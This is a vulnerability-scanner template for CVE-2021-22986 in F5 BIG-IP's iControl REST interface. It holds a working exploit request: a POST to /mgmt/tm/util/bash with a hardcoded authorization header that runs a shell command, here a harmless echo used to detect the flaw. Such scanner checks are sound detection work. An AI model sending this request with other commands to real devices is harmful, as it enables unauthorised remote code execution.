name: F5_BIG_IP_iControl_REST_Unauthenticated_RCE_CVE_2021_22986
transport: http
set: {}
detail:
  dock: product="F5-BIGIP"
  product: F5 Big-IP
  homepage: https://www.f5.com/
  impact: 'On BIG-IP versions 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x
    before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x
    before 7.1.0.3 and 7.0.0.x before 7.0.0.2, the iControl REST interface has an
    unauthenticated remote command execution vulnerability. Note: Software versions
    which have reached End of Software Development (EoSD) are not evaluated.'
  description: BIG-IP software products are licensed modules that run on top of F5's
    Traffic Management Operation SystemÂ® (TMOS). This custom operating system is an
    event driven operating system designed specifically to inspect network and application
    traffic and make real-time decisions based on the configurations you provide.
rules:
  r1:
    method: POST
    path: /mgmt/tm/util/bash
    follow_redirects: true
    headers:
      Authorization: Basic YWRtaW46QVNhc1M=
    body: '{"command":"run","utilCmdArgs":"-c ''echo tsxts|base64''"}'
    expression: response.status == 200 && response.body.bcontains(b'dHN4dHMK')
expression: r1()
